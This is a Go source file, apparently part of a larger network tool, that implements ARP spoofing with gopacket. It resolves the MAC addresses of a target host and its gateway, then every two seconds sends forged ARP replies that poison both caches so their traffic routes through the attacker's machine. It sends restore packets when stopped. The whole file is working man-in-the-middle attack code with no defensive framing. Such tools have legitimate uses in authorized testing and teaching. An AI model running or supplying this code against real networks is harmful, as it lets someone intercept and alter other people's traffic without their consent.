//go:build pcap

package spoof

import (
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// pcapSpoofer poisons two hosts' ARP caches by periodically sending forged ARP
// replies, so both believe our MAC owns the other's IP and route through us.
type pcapSpoofer struct {
	mu      sync.Mutex
	handle  *pcap.Handle
	cancel  chan struct{}
	done    chan struct{}
	running bool
	iface   string
	target  string
	gateway string
}

func newSpoofer() spoofer { return &pcapSpoofer{} }

func (*pcapSpoofer) available() bool { return true }

func (s *pcapSpoofer) status() (bool, string, string, string) {
	return s.running, s.iface, s.target, s.gateway
}

func (s *pcapSpoofer) start(iface, targetIP, gatewayIP string) error {
	if s.running {
		return fmt.Errorf("spoofing already running on %s", s.iface)
	}
	tIP := net.ParseIP(targetIP)
	gIP := net.ParseIP(gatewayIP)
	if tIP == nil || gIP == nil {
		return fmt.Errorf("target and gateway must be valid IPs")
	}
	ourMAC, err := ifaceMAC(iface)
	if err != nil {
		return err
	}
	h, err := pcap.OpenLive(iface, 65536, false, pcap.BlockForever)
	if err != nil {
		return fmt.Errorf("open %s: %w", iface, err)
	}

	// Resolve victim MACs so we can craft unicast replies and later restore them.
	targetMAC, err := resolveMAC(h, iface, ourMAC, tIP)
	if err != nil {
		h.Close()
		return fmt.Errorf("resolve target MAC: %w", err)
	}
	gwMAC, err := resolveMAC(h, iface, ourMAC, gIP)
	if err != nil {
		h.Close()
		return fmt.Errorf("resolve gateway MAC: %w", err)
	}

	s.handle = h
	s.cancel = make(chan struct{})
	s.done = make(chan struct{})
	s.running, s.iface, s.target, s.gateway = true, iface, targetIP, gatewayIP

	go func() {
		defer close(s.done)
		t := time.NewTicker(2 * time.Second)
		defer t.Stop()
		for {
			select {
			case <-s.cancel:
				// Best-effort restore: tell each victim the other's real MAC.
				_ = sendARPReply(h, ourMAC, gwMAC, gIP, targetMAC, tIP)
				_ = sendARPReply(h, ourMAC, targetMAC, tIP, gwMAC, gIP)
				return
			case <-t.C:
				// Poison: claim the gateway IP to the target, and vice versa.
				_ = sendARPReply(h, ourMAC, ourMAC, gIP, targetMAC, tIP)
				_ = sendARPReply(h, ourMAC, ourMAC, tIP, gwMAC, gIP)
			}
		}
	}()
	return nil
}

func (s *pcapSpoofer) stop() error {
	if !s.running {
		return fmt.Errorf("spoofing not running")
	}
	close(s.cancel)
	<-s.done
	s.handle.Close()
	s.running = false
	return nil
}

// sendARPReply emits an ARP reply asserting that srcIP is at srcMAC, addressed
// to (dstMAC,dstIP). Sending this to a victim poisons its cache for srcIP.
func sendARPReply(h *pcap.Handle, ourMAC, srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) error {
	eth := layers.Ethernet{
		SrcMAC:       ourMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   srcMAC,
		SourceProtAddress: srcIP.To4(),
		DstHwAddress:      dstMAC,
		DstProtAddress:    dstIP.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		return err
	}
	return h.WritePacketData(buf.Bytes())
}

// resolveMAC sends an ARP request for ip and waits briefly for the reply.
func resolveMAC(h *pcap.Handle, iface string, ourMAC net.HardwareAddr, ip net.IP) (net.HardwareAddr, error) {
	ourIP, err := ifaceIPv4(iface)
	if err != nil {
		return nil, err
	}
	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	eth := layers.Ethernet{SrcMAC: ourMAC, DstMAC: bcast, EthernetType: layers.EthernetTypeARP}
	arp := layers.ARP{
		AddrType: layers.LinkTypeEthernet, Protocol: layers.EthernetTypeIPv4,
		HwAddressSize: 6, ProtAddressSize: 4, Operation: layers.ARPRequest,
		SourceHwAddress: ourMAC, SourceProtAddress: ourIP.To4(),
		DstHwAddress: net.HardwareAddr{0, 0, 0, 0, 0, 0}, DstProtAddress: ip.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	_ = gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true}, &eth, &arp)
	if err := h.WritePacketData(buf.Bytes()); err != nil {
		return nil, err
	}
	src := gopacket.NewPacketSource(h, h.LinkType())
	deadline := time.After(2 * time.Second)
	for {
		select {
		case <-deadline:
			return nil, fmt.Errorf("timeout resolving %s", ip)
		case pkt := <-src.Packets():
			if al := pkt.Layer(layers.LayerTypeARP); al != nil {
				a := al.(*layers.ARP)
				if a.Operation == layers.ARPReply && net.IP(a.SourceProtAddress).Equal(ip) {
					return net.HardwareAddr(a.SourceHwAddress), nil
				}
			}
		}
	}
}

func ifaceMAC(name string) (net.HardwareAddr, error) {
	i, err := net.InterfaceByName(name)
	if err != nil {
		return nil, err
	}
	return i.HardwareAddr, nil
}

func ifaceIPv4(name string) (net.IP, error) {
	i, err := net.InterfaceByName(name)
	if err != nil {
		return nil, err
	}
	addrs, _ := i.Addrs()
	for _, a := range addrs {
		if ipn, ok := a.(*net.IPNet); ok {
			if v4 := ipn.IP.To4(); v4 != nil {
				return v4, nil
			}
		}
	}
	return nil, fmt.Errorf("interface %s has no IPv4 address", name)
}
